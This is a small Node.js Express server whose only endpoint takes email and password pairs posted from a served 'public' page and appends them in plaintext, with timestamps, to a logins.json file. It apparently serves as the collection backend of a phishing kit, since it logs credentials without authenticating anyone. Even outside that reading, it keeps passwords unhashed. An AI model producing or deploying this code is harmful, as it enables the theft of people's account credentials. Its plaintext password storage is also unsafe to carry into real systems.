const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.static("public")); // serve public folder

app.post("/save", (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).send("Missing fields");

    const logFile = path.join(__dirname, "logins.json");
    let logins = [];
    if (fs.existsSync(logFile)) {
        logins = JSON.parse(fs.readFileSync(logFile));
    }
    logins.push({ email, password, time: new Date().toISOString() });
    fs.writeFileSync(logFile, JSON.stringify(logins, null, 2));

    res.send({ status: "success" });
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
